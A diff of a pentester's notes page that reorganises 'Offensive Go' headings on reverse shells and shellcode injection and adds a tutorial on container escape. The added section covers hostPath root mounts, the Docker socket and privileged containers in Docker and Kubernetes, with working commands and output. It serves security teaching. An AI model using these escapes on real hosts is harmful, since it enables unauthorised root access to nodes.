@@ -179,20 +179,17 @@
 <li><a href="">CTF Write-ups</a></li>
 </ul>
 <h1><a class="header" href="#offensive-go" id="offensive-go">Offensive Go</a></h1>
-<h2><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h2>
+<h2><a class="header" href="#code" id="code">Code</a></h2>
 <ul>
 <li><a href="golang/./rev-shell.html">Reverse Shell</a></li>
-</ul>
-<h2><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h2>
-<ul>
 <li><a href="golang/./code-injection.html">Local Shellcode Injection</a></li>
-<li><a href="golang/./encrypted-generator.html">Encrypted Paylod Generator</a></li>
+<li><a href="golang/./encrypted-generator.html">Encrypted Payload Generator</a></li>
 </ul>
-<h2><a class="header" href="#exif-parser-fuzzing" id="exif-parser-fuzzing">Exif Parser Fuzzing</a></h2>
+<h2><a class="header" href="#fuzzing" id="fuzzing">Fuzzing</a></h2>
 <ul>
 <li><a href="golang/./exif-fuzz.html">Exif Parser Fuzzing</a></li>
 </ul>
-<h1><a class="header" href="#reverse-shell-1" id="reverse-shell-1">Reverse Shell</a></h1>
+<h1><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h1>
 <blockquote>
 <p><i class="fa fa-info-circle fa-lg"></i>
 To create a binary for a specific operating system or architecture, set the <code>GOOS</code> and <code>GOARCH</code> environment variables before running the <code>go build</code> command.<br/><br/>
@@ -232,7 +229,7 @@ func main() {
 	cmd.Run()
 }
 </code></pre>
-<h1><a class="header" href="#code-injection-1" id="code-injection-1">Code Injection</a></h1>
+<h1><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h1>
 <p>Example of injecting shellcode into a local process.</p>
 <hr />
 <h2><a class="header" href="#calling-the-windows-api" id="calling-the-windows-api">Calling the Windows API</a></h2>
@@ -370,13 +367,16 @@ func main() {
 <ul>
 <li>Used as a template Go file for the generator to include its encrypted shellcode and key.</li>
 <li>Decrypts shellcode with a given key and executes its memory via local code injection.</li>
-<li>Be sure to set GOARCH to 32 or 64-bit depending on your payload when using msfvenom shellcode.</li>
 </ul>
-<p>Linux / Darwin</p>
-<pre><code class="language-bash">$ GOOS=windows GOARCH=386 go build encrypted_shellcode.go
-</code></pre>
-<p>Windows</p>
-<pre><code class="language-powershell">PS C:\&gt; $Env:GOARCH=386; go build encrypted_shellcode.go
+<blockquote>
+<p><i class="fa fa-info-circle fa-lg"></i>
+Be sure to set GOARCH to 32 or 64-bit depending on your payload when using msfvenom shellcode.</p>
+</blockquote>
+<pre><code># Linux / Darwin
+$ GOOS=windows GOARCH=386 go build encrypted_shellcode.go
+
+# Windows
+PS C:\&gt; $Env:GOARCH=386; go build encrypted_shellcode.go
 </code></pre>
 <p>Encrypted Shellcode Template</p>
 <pre><code class="language-go">package main
@@ -431,7 +431,7 @@ func main() {
 <ul>
 <li><a href="https://github.com/tomsteele/pen-utils/blob/master/go-encrypt-shellcode-thing/main.go">tomsteele/penutils</a></li>
 </ul>
-<h1><a class="header" href="#exif-parser-fuzzing-1" id="exif-parser-fuzzing-1">Exif Parser Fuzzing</a></h1>
+<h1><a class="header" href="#exif-parser-fuzzing" id="exif-parser-fuzzing">Exif Parser Fuzzing</a></h1>
 <p>Writing a custom fuzzer for an exif parser using Go.</p>
 <hr />
 <h2><a class="header" href="#easy-fuzzing-target" id="easy-fuzzing-target">Easy Fuzzing Target</a></h2>
@@ -685,7 +685,142 @@ Segmentation fault
 <li><a href="https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg">Gynvael's Youtube Channel</a></li>
 </ul>
 <h1><a class="header" href="#containers--kubernetes" id="containers--kubernetes">Containers &amp; Kubernetes</a></h1>
+<ul>
+<li><a href="k8s/./hostpath.html">HostPath</a></li>
+<li><a href="k8s/./kubesec-sdk.html">Attacking Kube_Security_Lab w/ Client-go</a></li>
+</ul>
 <h1><a class="header" href="#hostpath" id="hostpath">HostPath</a></h1>
+<p>Abusing HostPath to escape containers.</p>
+<hr />
+<h2><a class="header" href="#mounting-root-volumes-inside-containers" id="mounting-root-volumes-inside-containers">Mounting Root Volumes Inside Containers</a></h2>
+<h3><a class="header" href="#docker" id="docker">Docker</a></h3>
+<p>Run an alpine container with root filesystem mounted under <code>/host</code> in the container</p>
+<pre><code>$ docker run --rm -it -v /:/host alpine:latest /bin/sh
+$ / # cat /etc/os-release
+NAME=&quot;Alpine Linux&quot;
+ID=alpine
+VERSION_ID=3.12.0
+PRETTY_NAME=&quot;Alpine Linux v3.12&quot;
+HOME_URL=&quot;https://alpinelinux.org/&quot;
+BUG_REPORT_URL=&quot;https://bugs.alpinelinux.org/&quot;
+</code></pre>
+<p>Changing my root directory to the <code>/host</code> directory with <code>chroot</code> allows us to break out of the container.</p>
+<pre><code>/ # ls
+bin    etc    host   media  opt    root   sbin   sys    usr
+dev    home   lib    mnt    proc   run    srv    tmp    var
+
+/ # chroot /host bash
+groups: cannot find name for group ID 11
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+root@3396f9188944:/# 
+</code></pre>
+<p>Show release information has changed to Ubuntu (WSL)</p>
+<pre><code>root@3396f9188944:/# cat /etc/os-release
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;20.04.1 LTS (Focal Fossa)&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 20.04.1 LTS&quot;
+VERSION_ID=&quot;20.04&quot;
+...&lt;snip&gt;...
+</code></pre>
+<p>Access to drives on the host</p>
+<pre><code>$ root@3396f9188944:/# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sdb        251G   28G  211G  12% /
+tools           1.8T  1.7T  131G  93% /init
+none             13G     0   13G   0% /dev
+tmpfs            13G     0   13G   0% /sys/fs/cgroup
+...&lt;snip&gt;...
+tmpfs            13G     0   13G   0% /mnt/wsl
+C:\             1.8T  1.7T  131G  93% /mnt/c
+D:\             112G   11G  102G  10% /mnt/d
+</code></pre>
+<h3><a class="header" href="#kubernetes" id="kubernetes">Kubernetes</a></h3>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: noderoot
+spec:
+  containers:
+  - name: noderoot
+    image: raesene/alpine-containertools
+    imagePullPolicy: Always
+    volumeMounts:
+    - name: root
+      mountPath: &quot;/host&quot;
+  volumes:
+  - name: root
+    hostPath: 
+      path: &quot;/&quot;
+</code></pre>
+<p>Exec into pod to see mounted host directory just like docker</p>
+<pre><code>$ kubectl apply -f noderoot.yaml
+pod/noderoot created
+
+$ kubectl exec -it pod/noderoot -- /bin/bash
+bash-5.0# chroot /host bash
+[root@noderoot /]# 
+</code></pre>
+<p><code>chroot</code> onto the host</p>
+<pre><code>[root@noderoot /]# cat /etc/os-release
+NAME=Fedora
+VERSION=&quot;33.20210104.3.1 (CoreOS)&quot;
+ID=fedora
+VERSION_ID=33
+VERSION_CODENAME=&quot;&quot;
+PLATFORM_ID=&quot;platform:f33&quot;
+PRETTY_NAME=&quot;Fedora CoreOS 33.20210104.3.1&quot;
+...&lt;snip&gt;...
+</code></pre>
+<h3><a class="header" href="#docker-socket" id="docker-socket">Docker Socket</a></h3>
+<p>The docker socker on the host is located at <code>/var/run/docker.sock</code>. Mounting this inside a container will allow processes running inside the container to interact with the docker daemon, and run additional containers.</p>
+<pre><code>$ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker /bin/sh
+/ # docker version
+Client: Docker Engine - Community
+ Version:           20.10.2
+ API version:       1.41
+ Go version:        go1.13.15
+ Git commit:        2291f61
+ Built:             Mon Dec 28 16:11:26 2020
+ OS/Arch:           linux/amd64
+ Context:           default
+ Experimental:      true
+...&lt;snip&gt;...
+</code></pre>
+<p>We can even see our own container running.</p>
+<pre><code>/ # docker ps
+CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS     NAMES
+e52efd14f85c   docker    &quot;docker-entrypoint.s…&quot;   About a minute ago   Up About a minute             dreamy_poincare
+</code></pre>
+<h3><a class="header" href="#privileged-containers" id="privileged-containers">Privileged Containers</a></h3>
+<p>Although we have complete access to the hosts filesystem, we still lack some capabilities we'd want to completely bypass all restrictions of the container and get true <code>root</code>.</p>
+<p>Use <code>capsh</code> to show some capabilities are missing, such as <code>cap_sys_admin</code>, the biggest bundle of privileges.</p>
+<pre><code>root@3396f9188944:/# capsh --print
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Ambient set =
+</code></pre>
+<p>Run the container again, but using privileged flag and see we have <code>cap_sys_admin</code> and have truely broken out as <code>root</code>.</p>
+<pre><code>$ docker run --rm -it --privileged -v /:/host alpine:latest /bin/sh
+/ # chroot /host bash
+groups: cannot find name for group ID 11
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+root@33507db52673:/# capsh --print
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+...
+</code></pre>
+<hr />
+<h2><a class="header" href="#references-3" id="references-3">References</a></h2>
+<ul>
+<li><a href="https://linux-audit.com/linux-capabilities-101/">Linux Capabilities</a></li>
+<li><a href="https://www.youtube.com/watch?v=HmoVSmTIOxM">The Path Less Traveled: Abusing K8s Defaults - Ian Coldwater &amp; Duffy Cooley</a></li>
+<li><a href="https://www.youtube.com/watch?v=OPuu8wsu2Zc">Seccomp Security Profiles and You - Duffy Cooley</a></li>
+<li><a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes Goat - Intentional Vulnerable K8s Cluster</a></li>
+</ul>
 <h1><a class="header" href="#kube_security_lab-w-client-go" id="kube_security_lab-w-client-go">Kube_Security_Lab w/ Client-go</a></h1>
 <h1><a class="header" href="#ctf-write-ups" id="ctf-write-ups">CTF Write-ups</a></h1>
 
